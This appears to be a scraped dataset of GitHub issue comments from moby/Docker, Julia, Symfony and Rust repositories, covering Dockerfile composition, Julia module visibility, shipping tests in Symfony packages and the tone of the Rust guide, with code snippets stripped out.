moby/moby/3378/296356475,@friend I appreciate the reply. I actually just used two random services as an example. My usual use case would be starting with a generic service (e.g. node based off of ubuntu) and a custom image of my own (also based off of ubuntu) and wanting to combine them. ,,False,False,3378
moby/moby/3378/296374380,"btw, it's not exactly rebasing but opens up a lot of use-cases for Dockerfiles. Dockerfile now supports multi-stage builds. Example You can have as many stages as you like. The  parameter basically switches the context to the specifed build target name. When you , the resulting image called  will be from the last stage. You can also build specific stages with , for example. There's a few other very nice Dockerfile enhancements in 17.05 (currently available as RC1), give it a try! ",,False,False,3378
moby/moby/3378/296429252,Now that is interesting! I didn't know you could do that. I'll have to give that a try to see if it solves my common use cases. ,,False,False,3378
moby/moby/3378/304155567,"While this is a great feature, having tried it out it doesn't really solve my most common problem. I just ran into it again today. I would like a Jenkins image that has Docker installed so that I can build from within the container. The fact of the matter is that there's no way to do this without replicating the install process of one or the other in my Dockerfile. This is a case where the blinkered arguments about this not being necessary since each container should only be one service obviously don't apply. My ""one service"" combines the functionality of Docker and Jenkins. ",,False,False,3378
moby/moby/3378/304160208,So you want to smash two dockerfiles into one so you don't have to copy/paste stuff? ,,False,False,3378
moby/moby/3378/304161640,Copy/paste is the equivalent of forking in this case. What I want to do is avoid forking a Dockerfile so I don't miss out on bug/security improvements or other changes when it invariably changes later on. ,,False,False,3378
moby/moby/3378/315121528,"Can't just pass by. Looking for a way to distribute changes over a long chain of images inheritance (deeper than 2). Multi-stage doesn't seem to be the thing that claryfies a problem. Having an entity that could contain just block of directives, allowing me to include it into all my inheritor images, together with base image functionality looks like rational evolution. ",,False,False,3378
moby/moby/3378/318867258,"For those wondering the right way to do this, from a Docker perspective, take a few minutes to review  he creates an entire tree of Dockerfiles.  As you go down the tree, you find different combinations of dependencies, each FROM the level above in the tree.  So if you followed the tree from  -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;pyTorch  + -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;TensorFlow -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;TensorFlow-pyTorch` Now, you still have to make a dockerfile that combines pyTorch and TensorFlow dockerfiles, but they key is that those files will be VERY SIMPLE, just a couple lines of install on top of deepLearningBase. So what is really needed is for several Larger-scale github repositories like this, for different ""worlds"", such as Web Development, Deep Learning, Embedded software, etc. Then you would just follow the tree to your required build, and if no one else made it yet, just add a node and combine 2 or 3 apt-get lines and make your new environment. ",,False,False,3378
moby/moby/3378/319159200,"That looks like the ""choose-your-own-adventure"" style of composition. INCLUDE would be a lot simpler. Hell, I just want to compose a specified  image with  so I don't have to install nano from apt-get every time! ",,False,False,3378
moby/moby/3378/340609550,"I concur with @friend in his above comment. There's no reason this shouldn't be possible in most cases (conflicts should be fairly rare, as they are on manually-managed OSes). ",,False,False,3378
moby/moby/3378/365619819,I have introduced a YAML configuration file which allows macros ,,False,False,3378
moby/moby/3378/381449355,"This is a use case quite similar to the one @friend commented, where neither @friend 's solution, neither multi-stage builds commented by @friend apply  A (debianstretch-slim) dockerfileAB -&gt; B (pythonslim-stretch) dockerfileAC -&gt; D ([build-stage] python-slim) dockerfileDE -&gt; E (ghdl/extvunit)     dockerfileAC -&gt; C (ghdl/runstretch-mcode)    where  The steps from A to C are exactly the same as those from B to D (dockerfileAC). The development team of B knows nothing about C, D or E. The development team of C knows nothing about B, D or E.  A user willing to build D (and/or E), must have access to dockerfileAC, but it is not required to know about dockerfileAB. Therefore, the user must have a better understanding of one dependency (C) than the other (B). Ideally, it should be possible to rely on teams A and B, and just build D as either  (merge) or  (rebase). Because GHDL is not a web service and VUnit is not a web client, both tools need to be installed in the same image/container (E). Multi-stage builds are not useful, because we need to build a (probably unknown) dockerfile with two  labels, it is not a single forward chain. If find this use case similar to the merge/rebase of two git branches sometimes there are no conflicts, sometimes the conflicts are easily resolvable, sometimes it cannot be merged at all because there is no common history... Is there any tool, either official or external, that provides this feature? ",,False,False,3378
moby/moby/3378/386082371,"Amazing this is still an issue and topic. How hard is it to ""INCLUDE someimage"", then when parsing it, check the base is compatible (in the FROM chain) and if so, execute the rest of THAT file at that point (as if I had copied the Dockerfile from the project and pasted it into mine)? The whole ""people will do bad things they don't realize"" excuse is absurd in this context. This is already insanely complex and that why we need this to help simplify it. ",,False,False,3378
moby/moby/3378/386109133,"@friend This is an entirely unhelpful comment. There are basically two reasons for it's why it's not one, either  It's not so easy No one has taken the time to do the work.  In reality, it is usually both. ",,False,False,3378
moby/moby/3378/386113417," It's a parsing and string-replace problem that any new coder could accomplish in all of 10 minutes IF they knew where in the code. I'm not saying it would be usable in all cases, but for the limited cases I'm seeing suggested here over and over (where bases are effectively common), it's a dead-ringer.  Of course not, this thread provides ~101 reasons it can't or shouldn't be done, so why would anyone think to do it regardless?   On the other hand, my comment serves (like SO many others here) to demonstrate that there is a need and with the hope to influence either the obstructing attitudes or to at least act as a reminder. If that's ""entirely unhelpful"", then you've just explained why this issue (ignored feature request) is still here and active and it's not a technical one and I'd point to your hollow post with little in the way of helpful facts, information or even opinions. ",,False,False,3378
moby/moby/3378/386116555,"It's way more than parsing a string. Docker and the Dockerfile is used by millions of people. Adding API's is a significant thing... even outside of that the underlying implementation is not ""parsing a string"". In any case there's many proposals to solve the problem and this is a very old and closed issue. ",,False,False,3378
moby/moby/3378/386413028,"I do think that if Docker doesn't figure out a clean solution to this scenario, it will probably be replaced by whatever tool does figure it out. I noticed one of my colleagues using the following pattern, which might be a decent workaround I haven't tried it myself though, so I'm not sure how it would work in practice, e.g. how it behaves with caching, etc. ",,False,False,3378
moby/moby/3378/386433765,"Indeed, this is a very important problem, and hasn't been addressed properly. I'm amazed a company as big as Docker haven't tackled it yet. ",,False,False,3378
moby/moby/3378/411526501,Just my two cents... I am just learning more about Docker at the moment and I feel something like INCLUDE would be very useful. I liked the multiple inheritance example above and wanted to address the comments about possible problems and conflicts with it. Multiple inheritance is hard in any language that supports it but when a conflict occurs it's the responsibility of the Docker file creator to rethink what they are doing and start again. Docker should just build the image and not try to prove the build has no issues. ,,False,False,3378
moby/moby/3378/411529506,"@friend I have support for macros in   I could support ""include"" too. ",,False,False,3378
moby/moby/3378/411810590,"That would be missing the point.  The goal is not to include the Dockerfile definition.  The goal is to include the docker image.  This is going to seem absurd because it is off the top of my head from fedora include ubuntu /ubuntu include debian /debian Reasonably I would expect this to start off with the image of fedora.  Then add the image for ubuntu under the folder /ubuntu.   Then added the image for debian under /debian . This is of course absurd, in that why do I want to mix a bunch of operating systems into one image?   But a more useful example might be from fedora include plex /plex include commericalremover /plex/add-on/commericalremover Now in this case it makes more sense.  In that if these are other images don't have operating specific components I have an easy way to make things modular. On Wed, 8 Aug 2018 at 1548, Arkady Miasnikov notifications@friend.com wrote ",,False,False,3378
moby/moby/3378/411824851,"That last one is possible already;  accepts both a build-stage, or an image, so for example; Edit; or to take the actual example; ",,False,False,3378
moby/moby/3378/411891661,"Exactly.   Which is why I would consider the 2017 update that added ""COPY --from"" as having completed the original request.   There is absolutely nothing more I was looking for from this ticket. Ideas that were brought up later like auto-rebasing the include, would be nice features.   But they do go beyond the original ask. Regards, Bill On Thu, 9 Aug 2018 at 1255, Sebastiaan van Stijn notifications@friend.com wrote ",,False,False,3378
moby/moby/3378/450858586,"@friend Using multi-stage builds for this still requires you to know which files exactly to copy from each image; that's even harder to maintain than copy-pasting the setup code from another image. Of course, merging Docker images is not trivial. Since arbitrary scripts can be run during builds, the build process resists any general attempt of automatic conflict detection; the halting problem says hi!  The best you can do (short of significantly limiting what builds can do) is to define precise semantics say the last / wins (e.g. if they ""write"" the same file) or fail on file-system-level conflict or .... The sometimes stated issue of different ""base"" images (stretch vs ubuntu vs alpine vs ...), however, is simple require that the DAG of image dependencies not only has a single source (the current image) but also a single sink (the shared ""ancestor"" of all images in the ""hierarchy""). Ultimately, of course, you'd get garbage-in-garbage-out -- is it ever different, really? FWIW, my use cases are  Running a Tomcat web application with a PostgreSQL database and an S3 object store.  While this can be solved by using Docker Compose, a single container may be nicer. Multi-language builds run in Docker containers (e.g. on Jenkins, Circle CI, ...).  There are official images for most popular toolchains, but getting a single container equipped to handle more than one runs in exactly the issue discussed here.  ",,False,False,3378
moby/moby/3378/450910217,"@friend , if you need dynamic generation of Dockerfiles  I suggest adding a domain specific language. There are a couple of examples I am aware of  ",,False,False,3378
moby/moby/3378/451039097,@friend This is not the only option. The right options is to constrain INCLUDEs to avoid big problems. INCLUDEs can't inherit. There it is. Simple. Still incredibly useful. This feature request is popular but Docker is Free as in Beer but not by any means Free as in Freedom. ,,False,False,3378
moby/moby/3378/451627679,"@friend With the inclusion of buildkit support since 18.06, users can provide their own frontend parser for the builder. There is already an official (from Docker Inc) experimental Dockerfile parser that includes lots of new features (support for secrets for starters). You can of course also add your own ""INCLUDE"" behavior in a custom Dockerfile frontend, or you can do something totally different that's not Dockerfile at all (there's an example for buidpacks). To use a custom frontend, just need to point Docker at an image which can handle it. Do this as a comment on the first line of your Dockerfile (or whatever thing it will be) More details here  buildkit enabled, Docker can build whatever you want it to (doesn't even have to be a Dockerfile format) with whatever features you need. ",,False,False,3378
moby/moby/3378/454758482,"As offtopic as that note is, I think it should be noted that you are wrong. Thanks to Docker's Apache licensing, everybody has the freedom to fork and develop their own interpreter for Dockerfiles that provides the features developed here. If they are careful, the resulting images will be compatible with existing Docker runtimes/tools. Of course, the maintainers of the Docker project are similarly free to not merge such a feature into their fork (the original?). ",,False,False,3378
moby/moby/3378/454816585,@friend That is obviously just meaningless rant without actually referring what is free software. Moby is free software of course. ,,False,False,3378
moby/moby/3378/454929600,"I did not know it was now Apache licensed. I apologize for the remark and think this is great! Russell Jurney @friend  LI  FB  datasyndrome.com On Wed, Jan 16, 2019 at 417 AM Raphael R. notifications@friend.com wrote ",,False,False,3378
moby/moby/3378/454930706,"I'm sorry, I didn't sleep well and I made a mistake. My comment stands. Free as in Beer means Apache. Free as in Freedom means community control. An Apache project or some other form of governance. Russell Jurney @friend  LI  FB  datasyndrome.com On Wed, Jan 16, 2019 at 1232 PM Russell Jurney russell.jurney@friend.com wrote ",,False,False,3378
moby/moby/3378/454964421,"Disagree. Freeware can be proprietary software. What's community control? Projects run by a foundation? So you would consider VS Code, Atom editor, and Ubuntu as non-free software? Then your definition is significantly different from the one proposed by FSF, EFF, and many other organizations. I agree that Docker Inc is not actively discussing with community in this issue, but this has nothing to do with ""Free as in Freedom"". ",,False,False,3378
moby/moby/3378/454967151,"Sorry folks, let's not have these sorts of discussions on the issue tracker. We have made it possible to support any build format you want to have via . The ""official"" Dockerfile format does not support this option, but that doesn't mean that  can't make use of it. Check out  as an example of building a custom frontend that works with . Note that this frontend is an example of how you can do something completely different from the Dockerfile format, but that is not necessary. You can take the existing Dockerfile format and add your own functionality if you like. As far as adding something into the official Dockerfile format.... I will say proposals are always welcome, the format is maintained in  in mind, though, every new feature means new burden of maintainership, including often limiting what can be done in the future. I think it's likely that many of the use case for combining multiple Dockerfiles can actually be solved with new functionality in Dockerfile... specicially the ability to  and  from arbitrary images. ",,False,False,3378
moby/moby/3378/500179198,"If this hypothetical INCLUDE could just create the extra containers as an impl detail with me NOT having to give a @#$% it would greatly reduce the amount of frustration surrounding the implicit and dodgy sales pitch of composable containers. I really just want to get back to the application and delivering functionality. Sorry for the the bad vibes, but I am docker/container noob and ran into the same confusion that a lot of other posters have already expressed. ",,False,False,3378
moby/moby/22285/150729862,"I've been running a few hundred containers with systemd in them since 1.7. The flags required has changed a little bit. In 1.10 I was adding , , and . With the same flags, it doesn't work in 1.11. With  it works. With  it does not work. Here's a dump of the system Thanks for the help! FYI This is the only thing I could find about the issue while Googling, and it suggests something indeed did change in 1.11 ",,False,False,22285
moby/moby/16417/107315701,"Currently, only functional test cases are included in the docker community. I plan to create some new performance/stress/stability test cases. For example, performance tests are as follow(included but not limited to)  CPU usage, Disk IO, network IO, TCP/IP bandwidth and latency,concurrent container quantity. Benefits are as follow. (1) They can provide docker users with performance reference. For example, a user need to deploy a server with docker. If the server's memory consumption figure is more than the benchmark data, the user can know much memory is need. (2) We can use them to track performance history data for each commit to find which patch leads to the increase or the decrease of performance data. But I wonder if the community would like to accept them. What is the attitude the docker community? ",,False,False,16417
julia/JuliaLang/17948/170503491,"Currently, when importing libraries in Julia, one cannot selectively import only the exported symbols of a package without bringing those symbols into the global scope.  This is often not wanted, and indeed the equivalent in C++ () is often recommended against. ",,False,False,17948
julia/JuliaLang/17948/238985660,use ,,False,False,17948
julia/JuliaLang/17948/239074759,"@friend That doesn't do what I want.  Consider these two files in the same directory Test1.jl Test2.jl This outputs 2.  I am looking for something that I can use instead of , such that  the first print expression will succeed (because module  will have been brought into scope) the second print expression will fail (because  has not been exported).  That is, I want  qualified access to the module's public API no access to the module's implementation details.  ",,False,False,17948
julia/JuliaLang/17948/239084741, provides a  macro that does this kind of thing ,,False,False,17948
julia/JuliaLang/17948/239187785,"There was some recent discussion about how the state of issues around modules and namespacing didn't reflect the general interest in improving them. I've reopened this and added a ""modules"" label for such issues. ",,False,False,17948
julia/JuliaLang/17948/239494285,"It would be nice to import two or more modules that share one or more exported symbols and designate which module is to be used when all or some of the symbol[s] are used without a module name prefixed (and then when used, not to have warnings about overwriting the so-dominated symbols generated). ",,False,False,17948
julia/JuliaLang/17948/239516450,"@friend that's a good point, but to me there is a world of difference between qualified and unqualified names. A lot of care absolutely must go into how  by itself is resolved. @friend I don't believe the analogy to  is correct;  does not bring all of its symbols into the global namespace, only the symbol . I can certainly appreciate why people don't want lots of names dumped into their namespace. But by the time you've written , why not just give the value of, well, ? In this case I subscribe to the ""we're all consenting adults here"" attitude. To restrict this, we'd be going to a lot of trouble just to slap you on the wrist and prevent you from accessing something. For example, how would you debug the module, e.g. test  interactively? I'm against complexity that only serves to prevent me from doing things. ",,False,False,17948
julia/JuliaLang/17948/239541695,"The problem is that ""import"" treats exported and non-exported symbols identically.  If I type , I don't know if  is part of the public interface of  or just an implementation detail. On Aug 12, 2016 158 PM, ""Jeff Bezanson"" notifications@friend.com wrote ",,False,False,17948
julia/JuliaLang/17948/239550844,"I agree it is good to know which is which.  will tell you just the exported names in a module. Currently tab completion shows all names, but I think it would be good to have a setting to only tab-complete exported names. Documentation also helps; it would be good for  to show a list of exported names, especially if the package lacks documentation. ",,False,False,17948
julia/JuliaLang/17948/239673991,"I would also like an easy way for this to be enforced at runtime. On Aug 12, 2016 424 PM, ""Jeff Bezanson"" notifications@friend.com wrote ",,False,False,17948
julia/JuliaLang/17948/239957777,"@friend Yes, I agree.  My perspective was forward -- resolving APIs, however they may become done.  It seems there needs to be an active way to assert dominance (in the form of how unqualified names are resolved when there is more than one qualified form available).  Maybe there is another way to express this API is a refinement of the that one.  Maybe there is a better way -- this one I noticed. ",,False,False,17948
julia/JuliaLang/17948/240521046,"@friend That would awesome! My preference is that we should hand-hold users more on the documentation side than on the runtime side. I like that Julia separates nonexported functions from exported ones, but doesn't hide them completely. ",,False,False,17948
julia/JuliaLang/17948/240724364,"It's entirely possible that a post-1.0 version of Julia will add access controls that allow some degree of enforced encapsulation, but preventing people from doing things is not a high priority for 1.0. ",,False,False,17948
julia/JuliaLang/17948/240848486,"I am not particularly interested in mandatory encapsulation.  I am more interested in making it easier to avoid using private functions, without polluting the global namespace. On Aug 18, 2016 935 AM, ""Stefan Karpinski"" notifications@friend.com wrote ",,False,False,17948
julia/JuliaLang/17948/240850214,I'm confused by your statement – how is that interest not satisfied currently? ,,False,False,17948
julia/JuliaLang/17948/240930293,"Currently, there is no way to get access to the public symbols of a module without either injecting them into your scope or making them appear indistinguishable (as far as the consuming code appears) from symbols that are merely implementation details.  So when you write ,  will get  whether it is public or not.  But if you write , then the only difference between exported and non-exported symbols is that , if exported, is injected into your global scope. I don't need for the abstraction barrier to be airtight.  But I do want it to be obvious when I am using something I probably have no business accessing. Perhaps this can be done by convention have a convention that private symbols are in inner modules whose name starts with an underscore, say. On Aug 18, 2016 442 PM, ""Stefan Karpinski"" notifications@friend.com wrote ",,False,False,17948
julia/JuliaLang/17948/240964173,"While I like the Python convention of prefixing private members of classes and modules with an underscore due to its simplicity it is not very aesthetically pleasing ;-) What is missing is a mechanism that allows one to import a single name but only if it is part of the public interface of the module, e.g. like shown below ",,False,False,17948
julia/JuliaLang/17948/241033021,"I have thought it felt a little backwards that  is more conservative than , since the latter allows extension. (Compared to just  which is less conservative than  due to bringing in the exports.) More behavioral distinction between the two might make it a little more obvious when to use one vs the other. ",,False,False,17948
julia/JuliaLang/17948/241034539,is also less conservative than  which does not feel right. ,,False,False,17948
julia/JuliaLang/17948/241092146,"One option would be a way to declare some symbols as private.  Getting access to them would require reflection (say On Aug 19, 2016 1032 AM, ""Helge Eichhorn"" notifications@friend.com wrote ",,False,False,17948
julia/JuliaLang/17948/241182368,"I like the idea of restricting  to only import exported symbols.  When it comes to qualified access to members of a module if we ever get  overloading then it could be natural to let  work, but require  with a . ",,False,False,17948
julia/JuliaLang/17948/243169681,"If access restriction is ever being added, would it be out of scope to add a more complex rights management in order to disable the IO part (and maybe others independently) of julia? (in order to make it a fully virtual runtime w/o any reality interaction and thus having a ""save"" environment) Concrete reason would be that i'd really love to be able to ""outsource"" parts of a program that i've written so that a user can manipulate it (crazy example i've written a multiplayer game and want to provide access to some underlying methods in order to change behaviour of some things in a pretty complex way, like manipulating the weather based on ingame events) But i obviously neither want any user to be able to shutdown nor misuse the server (for like running a DOS or sending viruses) I know there a a lot of other ways (depending on the situation/use case) to realize such a game, like writing a DSL, doing a whole AST check for ""invalid"" calls (that would be my solution if i had to solve it right now, similar to Reflection/SecurityManagers in Java) or doing the ""calculations"" clientside and only communicate by keywords (thus simply restricting what is considered senseful on the server) But i'm always happy to be lead to even more creative/prettier/faster or otherwise better solutions. That's just my 2 cents for the restriction idea. As i said, it's not about time but about scope (are there chances that julia will ever support such a use case) ",,False,False,17948
julia/JuliaLang/17948/243174120,"A more thorough capability or access control system is definitely a bigger problem. A library for launching missiles will export its  function since that's the entry point, but that doesn't mean everybody is allowed to launch missiles. This issue is really only about convenience, making it easier to avoid depending on private functions. For those purposes it's ok if there are workarounds like , but for real security the goal is to make it as close to impossible to launch the missiles as you can. ",,False,False,17948
julia/JuliaLang/17948/245263005,"Agreed. For security, you really want a microservices approach with an audited / verified kernel. ",,False,False,17948
julia/JuliaLang/17948/245266773,"o/t, but cloudabi has some really neat ideas with capability based security there ",,False,False,17948
julia/JuliaLang/17948/245373756,"cloudabi is Windows averse It is nice of them to allow others to use their relatively more secure versions of the cloudabi, 'nix zeitgiest apps and these other commonly used packages autoconf, automake, bash, bison, boost, buddy, bzip2, c-runtime, cairo, cairomm, cloudabi-reexec, cloudabi, cloudlibc, cmake, compiler-rt, coreutils, curl, cxx-runtime, diffutils, expat, findutils, flac, flex, freetype, fribidi, gawk, gettext, giflib, glib, gmpUpgr, grep, help2man, icu4c, jasper, jpeg, json-c, lcms2, libarchive, libatomic-ops, libcroco, libcxx, libcxxabi, libebml, libevent, libexif, libffi, libgcrypt, libgpg-error, libid3tag, libksba, libmad, libmatroska, libmngRena, libogg, libpng, libressl, libsamplerate, libsigcxx, libsndfile, libsodium, libtasn1, libtheora, libtomcrypt, libtomfloat, libtommath, libtompoly, libtool, libunwind, libvorbis, libwebp, libxml2, libxslt, libxspf, llvm, lua, lz4, lzo, m4, make, memcached, mpfr, nettle, ninja, nspr, openjpeg, opus, pcre, pcre2, picosat, pixman, pkgconf, python, qpdf, re2, sed, snappy, speex, speexdsp, taglib, texinfo, tiff, tomsfastmath, uriparser, x265, xz, yaml, zlib ",,False,False,17948
julia/JuliaLang/17948/260837624,"In Common Lisp,  can only access exported symbols, while  is for all symbols. It worked well. Too bad  already has a meaning. ",,False,False,17948
julia/JuliaLang/17948/260948148,could be reclaimed. There's also  which is already deprecated in 0.6 and will be fully available in 1.0. ,,False,False,17948
julia/JuliaLang/17948/270893732,"As far as I can tell, this is a dup of ",,False,False,17948
julia/JuliaLang/17948/378967344,"Yes, looks very much like a dup. ",,False,False,17948
symfony/symfony/17749/132715529,"The Source  Often when I'm auto-completing classes in my IDE, I get the suggestion to use the *Test file. Project wide searches and Usage Finder always shows tests using the search key or method/class etc. KernelTestCase and WebTestCase are library dependencies in a test directory  I'm working on adding some functional tests to a bundle and this gave me a problem. I had to depend on the FrameworkBundle 2.3 for BC reasons but I couldn't depend on 2.3 because that one didn't have the KernelTestCase yet so I needed 2.5. The Symptoms For applications the recommended location is in /tests/. For Application bundles this seem to be /Tests/ and the same goes for re-usable bundles. The current setup with the recommendations and implementations cause a few issues  I need to load files from the vendor Tests in order to run my tests. I get vendor test files which I can autoload and depend on. 2 different recommendations for test locations. I cannot easily exclude them from the distributed version.  The Solution Personally I always put my code in bundles in the /src/ directory, this gives me a clean root directory and my tests in /test/. This leaves the root directory for all the meta-information for your package (example). So my suggestion is  Extract the  and  to another component (PhpunitBridge?) where they can reside in the source instead of test location. Exclude the tests from the archive. Not put the source in the package root but in /src/ like suggested for applications. Put tests in /test/ or /tests/ where they have an autoload-dev so they cannot be loaded in production code.  This will create a clearer structure where your source is not polluted by the tests and you cannot put anything of your public api in your tests (like the TestCases). When the test-cases are moved out, I can also require 2.3 or higher instead of 2.5 and higher (thus 2.7). ",,False,False,17749
symfony/symfony/17749/182536635,"This topic has been discussed some time ago, the major problem with this idea is the subtree split of each component. ",,False,False,17749
symfony/symfony/17749/182541384,@friend Yeah I got informed about that. I've updated the issue. ,,False,False,17749
symfony/symfony/17749/182552387,"We used to have tests outside of the src directory (see  usually put test cases outside of the tests namespace already, so they're not part of the  namespace. Both WebTestCase and KernelTestCase are already in the  namespace (the first one was moved recently). ",,False,False,17749
symfony/symfony/17749/182799760,"To me there is a difference between tests  (internal, should not be extended in other packages) and test helpers  (traits/test-cases). When you ""need"" (there is no other way) to extend a test helper that is in  it should be moved to  so you can use it. I actually have that problem with some Doctrine tests,   I solved using  there is a risk of breakage here as I'm using classes that are not part of the public API and therefor have no BC policy. Mark tests directories as excluded plus one going to that now as I to have fallen trap to this... ",,False,False,17749
symfony/symfony/17749/182806356,"@friend, that's 68 (symfony 49) directories in total which I'd rather not even have on my filesystem to begin with. I only need them when I explicitly install that repository and I have to run them. Given I'd exclude Tests via a regex, the kernel/web tests are excluded too. The solution is valid but won't work if you have 20 applications and dozens of bundles which all use symfony. ",,False,False,17749
symfony/symfony/17749/183706833,This was also done with gitattributes and reverted in #6605 I still think this should be reintroduced as I said in ,,False,False,17749
symfony/symfony/17749/189947863," Tests are documentation and should remain next to their src. For production releases, I assume everyone has their own prefered deploy mechanisms removing files not needed for such an env can easily be accomplished during your preferred deploy operation. I too use PHPStorm I don't understand the difficulty of setting the tests directory to ignored within the IDE if such is desired.  ",,False,False,17749
symfony/symfony/17749/190122254,"@friend Because if you use symfony/symfony and have 20+ applications doing this, you'll spend too much time ignoring them, where as excluding tests from the packaged version is something you do with your own package, not that of others. ",,False,False,17749
symfony/symfony/17749/191877781,An other option ,,False,False,17749
symfony/symfony/17749/191883284,"I also just sent this message to github support Is there a way to get a ZIP that includes ALL files (i.e. that is built without taking .gitattributes into account?) That would be really great because that would allow us to have packages for our project one for humans (with the full source) and one for robots/ci-scripts (the current one). If anyone has the answer (or could push for making this happen), help welcomed ) ",,False,False,17749
symfony/symfony/17749/191898500,An other option would be to add a feature to composer to clean paths specified in the  option in composer.json files. ,,False,False,17749
symfony/symfony/17749/192028947,One more reasons to exclude tests Composer beta ,,False,False,17749
symfony/symfony/17749/192172162,"Here is my reasoning pro keeping tests where they are and also in the .zip archives  Some of us want the tests out, either because e.g ""they pollute their autocompleter, or their code searches or just their filesystem"". Some of us want the tests in, because e.g. ""having them always at hand enables this coding workflow of looking at tests to know how the code behaves and how it should be used"". You can grow the list of pro and contra arguments, the truth is that everyone is right this is a matter of personal preference. In this situation, we, as the Symfony project, can have two attitudes we can forcibly decide for others, or we can empower people in allowing both way of things. Given the history of this very topic, and the presented arguments at both sides, I'm now convinced that we should not enforce what would be otherwise a subjective and controversial ""best way"". So the question for me is now which choice allows both practices to coexist? The first aspect is the if we always ship the tests as we do today, 2. is allowed, and 1. is just one IDE configuration or cleaning script away. Moving tests out of each components folder breaks 2. for subtree splits. Looks like a no-go. Now moving tests out of archives since we install code through composer, we could use --prefer-dist for 1. and --prefer-source for 2. But this ignores one practical and fundamental difference --prefer-source is slow as hell. --prefer-dist has one ZIP to download, and then has local caching, which means it's fast, very fast. --prefer-source has to  and isn't cached as of now. Nobody can't possibly accept to loose so many time because ""hey, 2. is your choice, haha"". So, my point is that in practice, this has the same effect as not shipping the tests at all. No-go again.  In conclusion I'm all for the status quo, which is the best solution, unless --prefer-source can be made as fast as --prefer-dist (or any other way that would make fetching the tests as fast, see e.g. my email to github support). Meanwhile, I'm all for enhancing editorconfig or any other way to help 1. supporters configure their IDE or clean their filesystem. ",,False,False,17749
symfony/symfony/17749/192176071,"How many people actually spend time diving into tests and trying to understand them (which is usually more complicated than looking at the code)? If people really want to see the tests while they are developing they can choose already . If this is too slow for them, they can also view the files on github. By packaging the tests, people who don't use them or don't need them (My guess is 90%+) still get them. This is extra bandwidth, extra actions during deployment and extra effort in the IDE. If people really, really want to run the tests, they should make a clone (or grab the zip from github) and run it in there with their  dependencies. When the package comes from Packagist it should not include test files for the simple reason that most people won't even need them and should follow one of the above steps for a better workflow in the first place. In my eyes this would mean  Leaving the repository as is for github Adding composer excludes for packaging  ",,False,False,17749
symfony/symfony/17749/203854643,"@friend no, it's not a matter of personal preference. There are situations where you can do everything, but it's better to do only one thing (like putting your sources outside the  folder). There are two environments with different needs, dev &amp; prod, but we have to face the problems in the order of priority, so let's discuss prod before dev. In production we have two topics security and performance. NOT having additional files will always improve both. Security the only code that can't be broken, or can't broke something else, is the one that there isn't. Performance less code, less resources, less timings. The  already present it's good, but not enough. I am sad that you closed your  about  I highly hope that to be merged. Once the production is faced, only then we can discuss about development, and whether or not including additional informations (like tests) in a dev setup. ",,False,False,17749
symfony/symfony/17749/207341923,@friend any consideration about my previous thought and reopening ,,False,False,17749
symfony/symfony/17749/207345336,No way for me I won't take the lead on this topic... ,,False,False,17749
symfony/symfony/17749/220913973,What about this solution for the problem? ,,False,False,17749
symfony/symfony/17749/280589079,"Just out of interest, why does symfony recommend that the tests are in the root of a project but do not do this in symfony/symfony? I understand that there would be issues with the subtree split, but i’m sure something could be worked out? I’m not trying to force a change here but just understand the reasoning so I can work out my own best practice. Having the tests together in root seems like a logical and friendly solution. However symfony moved them out, does this mean the more complex projects get I would probably need to move them out too? ",,False,False,17749
symfony/symfony/17749/280602702,"@friend because we want to include tests in our subtree split repositories, and for that, they need to be in the split folder. ",,False,False,17749
symfony/symfony/17749/280605110,"@friend yes, as I say, I understand about that. However, as far as i recall this is some automated process (i think with split.sh) so there is probably a way around this to make it work. It just seems very strange to say ""We recommend you do it like this, but we do it differently"". If symfony/symfony immediately hit an unsolveable problem with this structure, perhaps there is something inherently wrong? ",,False,False,17749
symfony/symfony/17749/280609083,"@friend if you read official Symfony best practices, you may notice that there are different for non-reusable apps (ie your private project) than for shared packages/bundles. The recos that applies to apps are made to prevent doing things that bundle require, but are just overengineering to private apps. The same apply here. symfony/symfony is structured to reach its goals, which is not the goal of your private apps. ",,False,False,17749
symfony/symfony/17749/280610589,"@friend can we close this one? From the symfony project pov, this is solved to me, it's an argumented ""no"". I understand you don't agree, but that's still ""resolved"". ",,False,False,17749
symfony/symfony/17749/280612098,"@friend thanks, yes I understand that. Lots of private apps sometimes end up public / reusable tho. If this structure locks you in, or may create problems down the line, then it might not be advisable as a general standard. If there is a workaround to deal with it, mayne it would be good to standardise symfony/symfony too? Please dont think i am trolling you or trying to cause an problem here 😄. That is really not my intention and I am very grateful for all the hard work and though you guys put in 👍. I am just attempting to gain understanding and maybe offer perspective. Perhaps the solution is a mutually agreeable one? Perhaps there is a solution but ""it just isn't worth it"". Resistance to change without consideration can lead to unfortunate situations in the future. Perhaps this issue is just not high prio or maybe the discussion should be taken elsewhere? ",,False,False,17749
symfony/symfony/17749/280616335,"symfony/symfony is a meta project the project levels are the subtree splits. At the project level, tests are at the root. That's what @friend mentioned also. ",,False,False,17749
symfony/symfony/17749/280616993,I think this issue of symfony/symfony root vs package root will become a lot less once flex is released. ,,False,False,17749
symfony/symfony/17749/280623032,"@friend that makes it clearer to see it as a ""meta"" project. A bit strange that work is done on the meta project but i guess that is thats a side affect of the monolithic project approach. Definitely makes sense in this case tho, so thank you. @friend could you point me in the right direction for info on flex? ",,False,False,17749
symfony/symfony/17749/280624369,"@friend there's no public info on ""Symfony Flex"" project yet. It will be released ""soon"" and it will be a new way to install/manage Symfony applications in a ""composable"" way. ",,False,False,17749
symfony/symfony/17749/280624457,"@friend This was only announced during the SymfonyCon keynote for now, and the video is not yet available AFAIK. ",,False,False,17749
symfony/symfony/17749/280640396,"Great, I will keep a look out for it. Thanks for the info everyone 👍 ",,False,False,17749
rust/rust-lang/15539/37423990,"I've been reading the new Rust Guide. So far the chatty, informal, reassuring tone has left me waffling between being annoyed and being reassured, but mostly reassured. However, when I got to Programmers love car analogies, so I've got a good one for you to think about the  relationship between cargo and rustc rustc is like a car, and cargo is like a robotic  driver. You can drive your car yourself, of course, but isn't it just easier to let a  computer drive it for you?  The balance was tipped, and I became annoyed at the tone and started yearning for the old no-nonsense tutorial back. So I suggest removing that paragraph, since it adds little. ",,False,False,15539
rust/rust-lang/15539/48416066,"I specifically noted this, and nobody had any real objections at the time. ",,False,False,15539
rust/rust-lang/15539/48416951,"For what it is worth, I had the same “Ugh — too much cute!” reaction to A place for everything, and everything in its place.  ",,False,False,15539
